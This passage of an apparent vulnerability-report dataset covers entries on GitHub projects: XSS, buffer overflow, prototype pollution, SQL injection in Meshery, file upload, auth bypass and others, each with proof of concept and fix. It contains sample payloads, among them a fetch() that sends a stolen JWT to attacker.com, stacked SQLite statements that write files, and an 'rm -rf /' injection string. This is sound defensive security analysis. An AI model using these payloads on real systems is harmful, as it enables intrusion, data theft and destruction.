The Cross-Site Scripting (XSS) vulnerability occurs in applications due to improper handling or neutralization of user-supplied input, allowing malicious scripts to execute in the context of a user's browser. Here's a breakdown of why this vulnerability arises:

1. Lack of Input Sanitization
Cause: The application does not sanitize or escape user-provided inputs before rendering them in the HTML or DOM.

Example:

Edit
<div>User Name: <span id=""user"">${input}</span></div>
If a malicious user enters <script>alert('XSS')</script> as input, it gets rendered and executed directly in the browser.

2. Trusting User Inputs
Cause: The application assumes all inputs are safe and directly embeds them into HTML, attributes, or JavaScript.

Example: Dynamically setting an attribute value:

<img src=""${input}"">
An attacker could inject onerror=""alert('XSS')"" to execute a malicious script.

3. Output Context Mismanagement
Cause: User inputs are not properly escaped or encoded based on the output context (HTML, JavaScript, CSS, etc.).

Example: A string output in JavaScript context:

const message = ""${userInput}"";
alert(message);
If the user input is ""); alert('XSS');//, the attacker can inject and execute JavaScript.

CWE: CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
Severity: Medium

Reason: XSS can allow attackers to execute malicious scripts in the context of the user's browser, potentially stealing sensitive data, such as session tokens or personal information.

Impact: Data theft, account takeover, phishing.
"
54,1745602883501,https://github.com/TusharKukra/LMS-Library-Management-System,"CWE-121 ,CWE-120",Critical,2025-04-25T17:41:23.000Z,2025-04-27T10:31:05.000Z,"C++ Library Management System - Buffer Overflow Vulnerability

- Affected Components: 
  `book::createbook()` and `student::createstudent()` functions in `LMSCode.cpp`

---

Root Cause:
The program uses unsafe C-style input functions (`gets()` and `cin >>` into fixed-size character arrays) without bounds checking. These functions can write beyond the limits of allocated buffers, causing memory corruption.

For example:
```cpp
char bname[50];
gets(bname); // Vulnerable: no length restriction

char bno[6];
cin >> bno; // No input size restriction: buffer overflow possible
```

This results in stack corruption, potential instruction pointer overwrite, or adjacent variable modification.

---

Exploit Scenario:
1. Attacker runs the LMS program and selects ""Create Book"".
2. For Book Name, they input:
   ```
   AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
   ```
   (a string over 70 characters long).
3. The `gets(bname)` call writes past the `bname[50]` boundary, overwriting adjacent variables such as `aname`, `bno`, or potentially control data.
4. This leads to undefined behavior, including potential control flow hijack or program crash.

In advanced exploitation environments (e.g., no stack canary, executable stack), this could allow arbitrary code execution.

---

Why It Happens:
- `gets()` does not perform bounds checking.
- `cin >>` used on `char[]` without `.getline()` allows input longer than the buffer.
- No input sanitization or validation is present.
- Use of unsafe legacy headers and functions (`<conio.h>`, `gets()`, `clrscr()`) encourages poor memory safety practices.

---

Security Implications:
- Denial of Service (DoS) via crash
- Data corruption
- Arbitrary code execution  in vulnerable environments
- Potential privilege escalation in shared/multi-user systems

---

Suggested Fix:

1. Replace `gets()` with `std::cin.getline()`:
   ```cpp
   std::cin.getline(bname, 50);
   ```

2. Sanitize `cin >>` inputs:
   ```cpp
   std::cin >> std::setw(6) >> bno; // Protect bno[6]
   ```

3. Avoid deprecated headers and use `#include <iostream>`, `#include <cstring>`, etc.

4. Enable compiler protections:
   - Stack canaries (`-fstack-protector`)
   - AddressSanitizer (`-fsanitize=address`)
   - Compiler warnings (`-Wall -Wextra -Werror`)

5. Use C++ string classes (`std::string`) for safe dynamic memory handling.

---
Proof of Concept (PoC):

```cpp
Book bk;
bk.createbook();
```

Input:
```
Book No: 12345
Book Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Author: (leave blank)
```

Result:
- Stack memory corruption
- Potential overwrite of adjacent data (e.g., function return address in vulnerable builds)
"
55,1745613157740,Laverna/laverna/blob/master/app/scripts/apps/encryption/appEncrypt.js,CWE-285,High,2025-04-25T20:32:37.000Z,2025-04-28T06:06:05.000Z,"Vulnerability Type: CWE-285: Improper Authorization
Proof of Concept:
Radio.once('Confirm', 'auth', function() {
    Radio.request('encrypt', 'delete:secureKey');
    window.location.reload();
});
1. The code listens for the `Confirm:auth` event on the global `Radio` event bus.
2. When triggered, it deletes the secureKey and reloads the page.
3. No authentication check is performed before executing this critical operation.
4. Any script in the application (including malicious ones) can trigger this event:
   Radio.trigger('Confirm', 'auth');
Severity:  4 – High
Root Cause: The application registers an event listener that performs a critical operation (deletion of encryption key material) without verifying whether the caller is authorized. This leaves key lifecycle control exposed to untrusted scripts running in the same runtime.
Exploit Scenario: A malicious plugin or injected script (via stored XSS or developer tool manipulation) calls `Radio.trigger('Confirm', 'auth')`, which causes the user’s encryption key to be deleted and the page to reload. This disrupts encrypted session functionality and can lead to user confusion or DoS conditions.
 Why It Happens: The event hook relies on a global message bus and assumes that only legitimate, internal UI actions will trigger the event. However, since `Radio` is globally accessible in the app, it introduces a security-critical design flaw by allowing unauthenticated triggers.
Security Implications: An attacker with any access to frontend JS context can forcibly delete secure session keys, causing encrypted notes to become temporarily inaccessible. It opens the door to denial-of-service attacks or social engineering loops (forcing users to re-authenticate repeatedly).
Suggested Fix: Add an authentication check inside the event handler using `Radio.request('encrypt', 'check:auth')` to verify that the user is authorized before deleting the secure key. This ensures that only authenticated actions can trigger sensitive state changes."
56,1745644822677,ilhamclive/doctor-appointment-frontend/blob/master/src/context/AuthContext.jsx,CWE-922,High,2025-04-27T15:33:29.000Z,2025-04-27T21:54:33.000Z,"This vulnerability occurs because sensitive authentication tokens (JWT) are stored in localStorage, which is accessible from any JavaScript running in the browser.
The root cause is insecure client-side storage of tokens without mitigating XSS risks.
If an attacker injects malicious JavaScript via an XSS vulnerability on any page, they can steal the token and impersonate the user.
This can lead to full account takeover, privilege escalation, or data exposure.


Vulnerability Location:
The JWT token is stored in localStorage:

Line 41: localStorage.setItem(""token"", state.token);

This is security-sensitive logic, and it's relevant across:

https://github.com/ilhamclive/doctor-appointment-frontend/blob/master/src/context/AuthContext.jsx

Any component that consumes token from localStorage
Potentially exposed pages via XSS


Short Description of the Vulnerability Cause:
The vulnerability arises from storing sensitive authentication data (specifically the JWT token and user details) directly in the browser’s localStorage within the AuthContext logic:

Line 40: localStorage.setItem(""token"", state.token);
Line 41: localStorage.setItem(""user"", JSON.stringify(state.user));

This exposes the token to any JavaScript running on the page. If an attacker is able to inject malicious scripts through a Cross-Site Scripting (XSS) vulnerability anywhere in the application, they can access localStorage and steal the token. This compromises the user’s session and can lead to account takeover, especially if the token is long-lived or grants admin-level access.


Proof of Concept: 
Short Description of How an Attacker Could Exploit the Vulnerability
An attacker could exploit this vulnerability by injecting malicious JavaScript into a page via a Cross-Site Scripting (XSS) vector—such as an unsanitized input field, comment box, or a URL parameter that reflects into the DOM. Once the script runs in the victim's browser, it can access the localStorage and exfiltrate the stored JWT token and user information like this:

fetch(""https://attacker.com/steal"", {
  method: ""POST"",
  body: JSON.stringify({
    token: localStorage.getItem(""token""),
    user: localStorage.getItem(""user"")
  })
});
 Short Description of the Potential Consequences if Exploited:
If this vulnerability is exploited, an attacker can steal a user's JWT token and impersonate them across the application without needing their credentials. This can lead to account takeover, allowing the attacker to view sensitive personal data, perform unauthorized actions on behalf of the user, or escalate privileges if the stolen token belongs to an admin.


Suggested Fix:
To resolve this vulnerability, avoid storing authentication tokens in localStorage, as it is accessible to any script running in the browser and vulnerable to XSS-based token theft. Instead, use HttpOnly, Secure cookies to store JWT tokens—these cookies are inaccessible to JavaScript and automatically included in requests to the server"
57,1745658445192,requirejs/requirejs,CWE-1321,Medium,2025-04-26T09:07:25.000Z,2025-04-27T13:38:26.000Z,"Vulnerability Type: CWE-1321: Improper Neutralization of Special Elements in Object Key Used in JavaScript Object Injection ('Prototype Pollution')

Proof of Concept: 
In the RequireJS library (requirejs/requirejs), functions such as config() and s.contexts._.configure() accept user-supplied objects. These inputs are merged into existing internal structures without validation of property names. An attacker can pass an object containing the key ""__proto__"", which is merged into Object.prototype, affecting all objects.
Example exploit:
requirejs.config(JSON.parse('{""__proto__"":{""polluted"":""yes""}}'));

OWASP Top 10 Category: A08:2021 – Software and Data Integrity Failures

Severity: Medium (Level 3)

Root Cause: The vulnerable merging behavior does not account for JavaScript prototype pollution vectors, such as `__proto__`, allowing global object manipulation.

Exploit Scenario: An attacker injects a crafted JSON object into the configuration API of RequireJS. When parsed and merged, this pollutes Object.prototype, potentially leading to application logic corruption or security control bypass.

Why It Happens: JavaScript’s dynamic nature allows changes to Object.prototype to affect all objects. RequireJS merges user-defined objects into internal structures without sanitizing keys like ""__proto__"".

Security Implications: Exploiting this vulnerability can result in DoS, logic corruption, or further exploitation if application logic relies on object properties that are now maliciously overridden.

Suggested Fix: Implement input validation and object sanitization to skip unsafe keys like ""__proto__"", ""constructor"", and ""prototype"" during merges. Reject or recursively sanitize user inputs before integrating into core configuration."
58,1745667698800,https://github.com/adrianhajdin/node_express_crud_api/,CWE-693,Medium,2025-04-26T12:54:23.000Z,2025-04-26T17:17:51.000Z,"Vulnerability Type: CWE-693 Protection Mechanism Failure - Missing HTTP Security Headers

Proof of Concept: In the index.js file-

import express from ""express"";
import bodyParser from ""body-parser"";

import usersRoutes from ""./routes/users.js"";

const app = express();
const PORT = 5000;

app.use(bodyParser.json());

app.use(""/people"", usersRoutes);
app.get(""/"", (req, res) => res.send(""Welcome to the Users API!""));
app.all(""*"", (req, res) =>res.send(""You've tried reaching a route that doesn't exist.""));

app.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));

Here it is clear that the Express app is initialized without applying helmet, a middleware that sets security-related HTTP headers like X-Frame-Options, X-Content-Type-Options, and Strict-Transport-Security.

This can be secured by adding the helmet middleware which will add the security headers in the response of the server. The secure code will now become-

import express from ""express"";
import bodyParser from ""body-parser"";
import helmet from ""helmet"";      //here we import helmet middleware

import usersRoutes from ""./routes/users.js"";

const app = express();
const PORT = 5000;

app.use(bodyParser.json());
app.use(helmet());                     //Here we use the helmet middleware so that it can add the security headers to the request

app.use(""/people"", usersRoutes);
app.get(""/"", (req, res) => res.send(""Welcome to the Users API!""));
app.all(""*"", (req, res) =>res.send(""You've tried reaching a route that doesn't exist.""));

app.listen(PORT, () =>console.log(`Server running on port: http://localhost:${PORT}`));

Severity: 3 (Medium)

Root Cause: The application does not apply the helmet middleware, leading to missing security headers in HTTP responses. Without these protections, the application leaves the browser and users vulnerable to common client-side exploits.

Exploit Scenario: An attacker could create a malicious website that frames the Users API (clickjacking attack) or tries to execute a reflected XSS attack through API responses. Since protections like X-Frame-Options and Content-Security-Policy are missing, the browser would not block these malicious activities.

Why It Happens: The developers initialized an Express server but did not add middleware to set security headers. As a result, the server responds to HTTP requests without any browser-level security directives enforced.

Security Implications: An attacker could frame the application in a malicious page (clickjacking), inject scripts into responses (XSS), trick browsers into executing unintended code, or exploit HTTP response sniffing vulnerabilities. This could lead to unauthorized actions, theft of session data, or defacement of the API's front-end if integrated.

Suggested Fix:
Install and apply the helmet middleware in the Express app. Add import helmet from 'helmet'; and call app.use(helmet()); early in the middleware chain to automatically add common secure HTTP headers to all responses."
59,1745671113830,https://github.com/adrianhajdin/node_express_crud_api,CWE-117,Low,2025-04-26T12:38:33.000Z,2025-04-26T17:33:24.000Z,"Vulnerability Type:
CWE-117: Improper Output Neutralization for Logs

Proof of Concept:
This line in index.js is logging the IP and port information. 

app.listen(PORT, () => console.log(`Server running on port: http://localhost:${PORT}`));

In production, this can unintentionally expose internal network structure or server information to attackers with access to logs.

Root Cause:
The application directly logs the listening server address and port without considering the environment (development vs production). This results in leaking system details that should be hidden in production environments.

Exploit Scenario:
An attacker who gains access to production logs could see internal IP addresses, exposed ports, or service bindings. These details can then be used to plan internal attacks or find open services.

Why It Happens? 
The server’s startup code always outputs detailed system information without checking the execution context (development vs production), failing to neutralize sensitive data in logs.

Security Implications
Leakage of server address and port in production logs could help attackers perform lateral movement, open port scanning, network footprinting, and internal infrastructure mapping.

Suggested Fix:
Control logging behavior based on environment variables. In production, log only general success messages without exposing sensitive details like server IPs or ports."
60,1745672506832,https://github.com/yahoo/serialize-javascript.git,CWE-79,High,2025-04-29T05:21:10.000Z,2025-04-29T06:46:20.000Z,"Summary-
serialize-javascript versions ≥ 6.0.0 and < 6.0.2 allowed unescaped URL and object content to be inlined into JavaScript code passed to eval(), enabling critical client-side XSS (CVE-2024-11831 / GHSA-76p7-773f-r4q5) whenever serialized data reached a browser’s execution context. Commit f27d65d3 replaced raw string concatenation with a call to the library’s own serialize()—escaping /, <, >, "" as Unicode codepoints—thereby preventing any early string termination or injected script execution 

Files: index.js, test/unit/serialize.js

Vulnerability Explanation-
How the Flaw Occurred
Raw concatenation into code:
// before fix
return ""new URL(\"""" + urls[valueIndex].toString() + ""\"")"";

This directly embeds urls[valueIndex].toString(), which an attacker can control, into a JavaScript string literal without escaping special characters 

Use of eval(): Many applications then do eval( serialize(...) ) to revive objects, so any injected code runs immediately in the client’s context 

Missing sanitization: No filtering or encoding of ""<"", "">"", ""/"", or '""' meant a payload like </script><script>…</script> closed the literal and injected new script tags.

One-Line Fix in Commit f27d65d3-
- return ""new URL(\\"""" + urls[valueIndex].toString() + ""\\"")"";
+ return ""new URL("" + serialize(urls[valueIndex].toString(), options) + "")"";

By running the URL string through serialize(…, options), all high-risk characters become escaped (/ → \u002F, < → \u003C, "" → \u0022), so they can’t break out of the intended literal 

Exploitation Scenarios-
Reflected XSS in SSR pages

A server embeds serialized state in HTML:
<script>window.DATA = /* serialized */; eval(window.DATA);</script>

Attacker controls part of that state containing a malicious URL.

Browser executes injected <script> block. 

Persistent XSS via user profiles

A web app stores user-provided URLs in profiles.

On profile view, it does eval(serialize(profileData)).

Malicious URL payload executes whenever any user views that profile.

RCE in desktop apps

Electron or React-Native apps sometimes eval() serialized JS.

Injected code runs with full local privileges, reading files or spawning processes 

Impact-
Client-Side XSS (CWE-79): Attackers steal session cookies, perform actions as victims, phish users .

Remote Code Execution: In desktop/hybrid contexts (eval in Electron), arbitrary system commands can run 

Supply-chain risk: serialize-javascript is a dependency of thousands of projects—many silently vulnerable until they upgrade 

Data integrity & privacy: Malicious scripts can rewrite page content, exfiltrate PII, install keyloggers.

Mitigations & Best Practices-
Upgrade to serialize-javascript ≥ 6.0.2 immediately .

Avoid eval() on serialized data. Prefer JSON.parse or domain-specific deserializers.

Escape untrusted data: Always run strings through a proven serializer or encoder before embedding in code or HTML 

Enforce CSP: Use Content-Security-Policy: script-src 'self'; to block inline scripts as a defense-in-depth layer 

Sanitize inputs at boundaries; never trust data from clients or third-party sources.

Automated scanning: Incorporate SAST/DAST tools to detect unsafe eval usage and unsanitized concatenations.

References:
GitHub Advisory GHSA-76p7-773f-r4q5 (CVE-2024-11831)

NVD entry CVE-2024-11831 
OWASP Cheat Sheet Series

Commit f27d65d3de42affe2aac14607066c293891cec4e diff 
OWASP Cheat Sheet Series

OWASP XSS Prevention Cheat Sheet 

OWASP DOM-based XSS Prevention Cheat Sheet 

Snyk advisory on serialize-javascript XSS 

ScanRepeat analysis of serialize-javascript RCE in Electron 

Red Hat Bugzilla: CVE-2024-11831 details

Access Red Hat errata RHSA-2025:1334

Access Red Hat errata RHBA-2025:0304

OWASP HTTP Headers Cheat Sheet (CSP guidance) 

Bugzilla report on unsafe regex serialization

Serialization security best practices (Pragmatic Web Security) 

GitHub issue yahoo/serialize-javascript#173"
61,1745672615527,warlordthesaviour/Web-Sayfasi/blob/master/admin/bduyuru.php,CWE-434,High,2025-04-28T14:05:29.000Z,2025-04-28T23:35:15.000Z,"CWE-434: Unrestricted File Upload
Vulnerability Type:
CWE-434: Unrestricted File Upload

Proof of Concept:

$dosya = $_FILES[""file""][""name""];
$tmp_name = $_FILES[""file""][""tmp_name""];
$ext = strtolower(pathinfo($dosya, PATHINFO_EXTENSION));
$mime = mime_content_type($tmp_name);
$yeni_ad = ""../files/"" . uniqid() . '.' . $ext;
if (move_uploaded_file($_FILES[""file""][""tmp_name""], $yeni_ad)) {
    $kontrol = @mysql_query(""insert into bduyuru(baslik, icerik, tarih, unvan, dosya) values('$baslik', '$icerik', '$tarih', '$level', '$yeni_ad')"");
}
Step-by-Step Explanation:

File Upload Logic: The code allows users to upload files by checking the file extension and MIME type. It then saves the file on the server with a unique name to avoid file name collisions.

Missing Proper Validation: Although the file extension is checked and the MIME type is determined, there is no thorough verification of the file's content to ensure it is safe.

Risk of Malicious File Upload: This leaves the application open to attackers who can upload dangerous files, such as PHP scripts or other executable files disguised as legitimate file types (e.g., .jpg, .png).

Severity:
high– The vulnerability can lead to remote code execution and server compromise, which can have severe security consequences.

Root Cause:
The issue stems from inadequate validation of the uploaded file. While the code checks the file extension and MIME type, it does not properly verify the file's internal content. Attackers can easily manipulate file metadata (e.g., file extension or MIME type) to upload malicious files, potentially leading to code execution on the server.

Exploit Scenario:
An attacker could exploit this vulnerability by uploading a malicious PHP file disguised as an image (e.g., malicious.php.jpg). Since the file extension is allowed and MIME type may appear as a valid image, the file would pass the validation and get uploaded to the server. If the file is stored in a web-accessible directory that allows execution of PHP files, the attacker can access and execute the PHP file, taking control of the server.

Why It Happens:
The vulnerability arises because the application does not sufficiently inspect the content of the uploaded file. It only checks the file extension and MIME type, both of which can be easily manipulated by an attacker. Additionally, the file is uploaded without any check for dangerous content or scripts, making the system vulnerable to file-based exploits.

Security Implications:
If an attacker successfully uploads a malicious file, they could execute arbitrary code on the server. This could lead to a range of attacks, including:

Remote Code Execution (RCE): Attacker could run arbitrary PHP or shell commands on the server.

Data Theft: Attacker could access sensitive data stored on the server.

Privilege Escalation: Attacker could escalate privileges or take control of the web server.

Denial of Service (DoS): Attacker could overload the server or cause it to crash.

Suggested Fix:
Restrict File Types Strictly: Implement a comprehensive whitelist for allowed file types, ensuring that only specific, safe file types (such as images, PDFs) are allowed.
Sanitize File Names: Sanitize file names to avoid issues with special characters or malicious paths (e.g., .., /, etc.).
Limit File Size: Implement file size restrictions to mitigate the risk of uploading large, malicious files that could overwhelm the server.
"
62,1745674040499,https://github.com/warlordthesaviour/Web-Sayfasi/blob/master/admin/index.php,CWE-703,Medium,2025-04-26T13:27:20.000Z,2025-04-27T14:57:27.000Z,"Vulnerability Type:
CWE-703: Improper Check or Handling of Exceptional Conditions
This vulnerability happens when software incorrectly handles exceptional conditions (such as redirects) and continues execution instead of safely terminating operations, leading to unintended behavior like unauthorized access.

Proof of Concept:

if(!oturum_kontrol(sGet('user'),sGet('pass'))){
    header('Location:../login.php'); 
    // No exit(); following the redirect header
}
The application performs a user session check and attempts to redirect unauthenticated users to the login page using the header() function. However, the absence of exit(); causes the PHP script to continue processing additional include() files after the redirection, even for users without valid sessions. This flaw allows sensitive parts of the application (like admin pages) to be accessed, despite the intended authentication controls being triggered.

Severity:
High — Because this allows unauthenticated users to access sensitive internal functionality such as administrative actions. This severely compromises the authentication logic of the application, potentially leading to unauthorized data exposure, privilege escalation, and full system compromise.

Root Cause:
The root cause is a missing termination (exit();) immediately after issuing an HTTP redirection header (header('Location:...')). Without explicitly stopping script execution, PHP continues to parse and execute all following lines. This improper control flow allows sensitive files to be loaded and processed even after a redirection is supposedly sent, bypassing intended access restrictions.

Exploit Scenario:
An attacker can directly browse to a protected admin page (admin.php?sayfa=ekle) without logging in. Although the server sends a Location:../login.php redirect header, it still processes sensitive admin files like userekle.php. With tools like Burp Suite, an attacker can intercept or ignore redirects and directly interact with restricted content, gaining unauthorized access to create users, modify settings, or view confidential information.

Why It Happens:
This vulnerability occurs because in PHP, sending a redirect with header('Location:...') only modifies the HTTP headers — it does not halt script execution. Developers must manually call exit(); afterward to stop further processing. Without it, even after redirection headers are sent, the server continues loading critical files and rendering outputs, unintentionally exposing secured functionality to attackers.

Security Implications:
If this vulnerability is exploited, an attacker can completely bypass authentication checks and gain access to administrative interfaces or internal functionality without any valid credentials. They may escalate their privileges, leak sensitive user or system data, alter system configurations, or execute additional unauthorized actions that could destabilize or compromise the entire application and its associated database.

Suggested Fix:
Developers must immediately terminate script execution after sending any redirection header to prevent further code execution. This is done by inserting an exit(); function call immediately after the header('Location:...') line. Additionally, thorough security audits should be performed to ensure that all redirection logic across the application properly terminates execution where necessary.

header('Location:../login.php');
exit();"
63,1745676345129,https://github.com/MayaPosch/BMaC/blob/master/ota/ota.php,CWE-89,High,2025-04-26T14:05:45.000Z,2025-04-27T07:44:19.000Z,"Root Cause: Unsanitized user input from HTTP parameters (uid, update, delete) is directly concatenated into SQL queries, allowing arbitrary SQL execution.

Exploit Scenario: An attacker could craft malicious UID values like '""; DROP TABLE firmware;--' to manipulate/delete database entries or exfiltrate sensitive firmware metadata.

Why It Happens: The code constructs SQL queries through string concatenation instead of using parameterized statements. User-controlled data flows directly into queries without validation or escaping.

Security Implications: Attackers can execute arbitrary SQL commands to delete data, bypass authentication, extract sensitive information, or corrupt the firmware database entirely.

Suggested Fix: Use prepared statements with bound parameters for all database operations. Replace string concatenation with SQLite3::prepare() and bindValue() to separate query structure from data."
64,1745678746113,https://github.com/MayaPosch/NymphCast/blob/master/src/server/android/app/jni/freetype/src/truetype/ttgxvar.c,CWE-476,Medium,2025-04-26T14:45:46.000Z,2025-04-27T07:55:02.000Z,"Root Cause:
Memory allocation and table‐reading routines (e.g., via FT_QNEW_ARRAY, FT_FRAME_ENTER) can return or leave pointers set to NULL on failure, but the code immediately dereferences these pointers without checking for NULL, leading to uncontrolled usage of invalid pointers.

Exploit Scenario:
An attacker crafts a malformed TrueType GX variation table (fvar, gvar, cvar, or avar) with incorrect size or run-length fields. When the loader reads packed points or deltas, allocation fails or stream reads return NULL, and the subsequent unguarded pointer dereference crashes the process.

Why It Happens:
The implementation relies on FreeType macros to allocate and read data, but never verifies the success of those operations. Error paths jump out only in some cases, leaving pointers NULL yet still used by the normal‐flow code, causing dereference of a NULL pointer.

Security Implications:
By supplying specially crafted font data, an attacker can trigger a NULL‐pointer dereference, crashing or restarting the application (denial-of-service). In certain environments, this could also lead to memory corruption or control‐flow hijacking.

Suggested Fix:
After every allocation or table-read macro call (FT_QNEW_ARRAY, FT_NEW_ARRAY, FT_FRAME_ENTER, etc.), explicitly check that the returned pointer is non-NULL. On failure, abort processing of the font data or clean up and return an error, never proceeding to dereference the pointer.

 "
65,1745679375500,sqlpad/sqlpad/blob/master/server/auth-strategies/auth-proxy.js,CWE-290,Critical,2025-04-26T14:56:15.000Z,2025-04-27T05:47:09.000Z,"Vulnerability Type: CWE-290: Authentication Bypass by Spoofing
Proof of Concept:
Vulnerable Code:

const headerUser = getHeaderUser(req);
// ...
if (!headerUser.id && !headerUser.email) {
  return done(null, false);
}

1. The server trusts the values from `getHeaderUser(req)` without verifying authenticity.
2. Attacker sends forged HTTP headers (`X-User-Id`, `X-User-Email`, `X-User-Role`) with any request.
3. The server uses these header values to authenticate the attacker without further validation.
4. If auto-signup is enabled, the server even creates new users based on forged headers, assigning arbitrary roles like ""admin"".

Severity: 5 – Critical
Root Cause: The authentication mechanism fully trusts user-supplied HTTP headers without cryptographic validation or origin checking, allowing attackers to spoof identities or escalate privileges by manipulating incoming request headers.
Exploit Scenario: An attacker sends a specially crafted request with `X-User-Email: admin@example.com` and `X-User-Role: admin`, and the server authenticates them as an admin or creates a new unauthorized admin account, granting full control over the application.
Why It Happens: The auth proxy strategy assumes that header values are trustworthy without applying any form of digital signature validation, whitelist verification, or IP restrictions, exposing the authentication mechanism to straightforward spoofing attacks.
Security Implications: An attacker can bypass authentication, impersonate any user including admins, create unauthorized privileged accounts, compromise application integrity, steal sensitive data, and execute administrative actions, resulting in full system takeover.
Suggested Fix: Implement strict validation by allowing only a fixed set of roles (e.g., ""viewer"", ""editor""), whitelist allowed header values, reject unverified headers, and use cryptographic methods to ensure the authenticity of incoming headers."
66,1745683250671,https://github.com/meshery/meshery/tree/v0.7.20,CWE-89,Critical,2025-04-29T14:58:43.000Z,2025-04-29T15:34:04.000Z,"Detailed Explanation – CVE-2024-35181 / GHSA-9f24-jrv4-f8g5 (Meshery SQL-Injection in order param)
Where the bug is
server/handlers/meshsync_handler.go, inside the GetMeshSyncResourcesKinds REST handler. Before v0.7.22 the code simply did:

go
Copy
Edit
order := r.URL.Query().Get(""order"")   // attacker-controlled
if order != """" {
    result = result.Order(order)      // raw string inserted into SQL
}
Because GORM concatenates that string verbatim into ORDER BY, anything after a semicolon becomes a second SQL statement. SQLite, the default Meshery database, happily executes stacked statements.

Exploitation Flow (narrative)
Probe – An attacker discovers that
GET /api/system/meshsync/resources/kinds?order=test
changes the sorting of the JSON output. That confirms the parameter is reflected in the query.

Inject – The attacker now supplies a stacked query:

pgsql
Copy
Edit
/api/system/meshsync/resources/kinds?
order=foo;ATTACH DATABASE '/tmp/evil.db' AS pwn--
SQLite executes the legitimate ORDER BY foo and then attaches a new on-disk database file owned by the attacker.

Write – With evil.db attached, the attacker issues another request:

pgsql
Copy
Edit
order=foo;CREATE TABLE pwn.shell(cmd TEXT);INSERT INTO pwn.shell
VALUES('echo pwned > /tmp/owned')--
The Meshery process writes arbitrary data to the server’s filesystem through SQLite.

Read / Corrupt – The same technique lets the attacker SELECT from any table (dumping performance profiles that contain session cookies), UPDATE rows, or even DROP TABLE to brick the service.

The entire attack can be carried out with nothing more than crafted GET requests; if the endpoint is exposed without authentication (a common demo setup) no credentials are required.

Security Impact
Arbitrary file write – ATTACH DATABASE gives direct write access anywhere Meshery’s Unix user has permission, opening the door to local-privilege escalation or persistent backdoors.

Data breach – Full read/write on Meshery’s SQLite DB exposes stored Kubernetes configs, access tokens, and user cookies.

Integrity loss – Attackers can alter Meshery’s internal state, poison performance data, or inject malicious configuration into connected clusters.

Availability – Dropping or corrupting tables crashes Meshery, knocking out service-mesh management for the whole environment.

Potential RCE – If a writable path overlaps with a location later executed (e.g., a plugin directory), the file-write primitive can escalate to code execution.

Fix
Commit 8e995ce21a… (released in v0.7.22) inserts:

go
Copy
Edit
order = models.SanitizeOrderInput(order,
        []string{""created_at"", ""updated_at"", ""name""})
SanitizeOrderInput allows only those three column names and an optional ASC/DESC. Any other input—including stacked-statement payloads—gets rejected, so result.Order() is never called with attacker content.

Mitigation Checklist
Upgrade to Meshery ≥ 0.7.22 (or apply the same whitelist patch).

Restrict external access to all /api/system/meshsync/* routes.

Run Meshery under a filesystem profile that can’t write outside its own data directory.

Search existing servers for unexpected *.db files in /tmp/ or elsewhere and audit the main SQLite database for rogue tables.

"
67,1745686182732,https://github.com/sagargoswami2001/School-Management-System-Using-Python,CWE-78,High,2025-04-27T08:44:40.000Z,2025-04-27T09:45:13.000Z,"Vulnerability Type:
Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')

Root Cause:
The code dynamically constructs and executes Python code using the exec() function based on a list of variable names.
If an attacker can manipulate the list content or influence its source indirectly (e.g., through future code refactoring, user input, or external variable loading), arbitrary system commands could be executed.

File: School_Management_System.py
Function: reset_fields()
Lines: 33–36

Vulnerable Code:

python
Copy
Edit
def reset_fields():
    global name_strvar, email_strvar, contact_strvar, gender_strvar, dob, stream_strvar

    for i in ['name_strvar', 'email_strvar', 'contact_strvar', 'gender_strvar', 'stream_strvar']:
        exec(f""{i}.set('')"")  # <-- VULNERABLE LINE (Line 35)
    dob.set_date(datetime.datetime.now().date())
Exploit Scenario:
An attacker manages to insert a crafted string such as ""__import__('os').system('rm -rf /')"" into the list used inside the reset_fields() function.
When exec() runs, it directly evaluates the payload, leading to execution of destructive OS-level commands, resulting in full system compromise or data loss.

Why It Happens:
The exec() function executes arbitrary code passed as a string without enforcing any restrictions.
Without proper sanitization and strict variable control, using exec() opens up a severe remote code execution (RCE) vulnerability, even if the original code paths were trusted.

Security Implications:
Successful exploitation may lead to:

Arbitrary code execution

Full system takeover

Unauthorized data manipulation or deletion

Denial of service (DoS) via system resource exhaustion

Severe breach of system confidentiality, integrity, and availability

Recommended Fix
Completely eliminate use of exec().
Instead, access and reset each variable directly:

Secure Replacement Code:

python
Copy
Edit
def reset_fields():
    global name_strvar, email_strvar, contact_strvar, gender_strvar, dob, stream_strvar

    # Safe direct variable access
    name_strvar.set('')
    email_strvar.set('')
    contact_strvar.set('')
    gender_strvar.set('')
    stream_strvar.set('')
    dob.set_date(datetime.datetime.now().date())
Additional Recommendations:

Avoid any form of dynamic code execution (exec, eval, compile, etc.) unless absolutely unavoidable and properly sandboxed.

Apply strict control over user inputs and internal data structures.

Conduct regular code audits focusing on identifying and removing dynamic execution patterns.

Educate developers about secure coding practices, especially around runtime evaluation functions.

Important Note:
The use of dynamic execution functions (exec, eval) should be strictly avoided unless absolutely necessary — and even then, only with thorough input sanitization, whitelisting, and proper sandboxing mechanisms in place."
68,1745687578826,https://github.com/hughsk/flat.git,CWE-1321,Critical,2025-04-27T11:10:12.000Z,2025-04-27T12:19:39.000Z,"Prototype Pollution Vulnerability Explanation and Exploitation Impact

Prototype Pollution occurs when an attacker can inject or modify properties on JavaScript’s built-in Object.prototype. Because nearly every object inherits from Object.prototype, any change there “pollutes” all objects in the application, potentially altering logic, bypassing security checks, or even enabling remote code execution.

How this code is vulnerable
• The snippet uses a loop to copy properties from a “recipient” object into another, without ever blocking the special keys __proto__ or constructor.prototype.
• When the code sees while (key2 !== undefined) { … recipient[key1] … }, an attacker can supply key1 = ""proto"" (or ""constructor.prototype"") and key2 = some value.
• The assignment recipient[key1][key2] = value silently writes onto Object.prototype, because recipient[""__proto__""] refers to the shared prototype object 

Exploitation steps

Attacker provides a malicious object such as:
let input = { ""__proto__"": { ""admin"": true } };
deepMerge(target, input);

After the merge loop, Object.prototype.admin === true.

Any code that later checks if (user.role === ""admin"") or if (someObj.admin) will erroneously succeed for all users or all objects

Impact
• Authorization bypass: Every user appears to have admin privileges.
• Data exposure: Protected data paths become accessible because security checks read polluted flags.
• Remote Code Execution: If the application uses gadgets—functions that read or execute based on certain properties—an attacker can chain pollution into executing arbitrary code on the server 
github.com
.
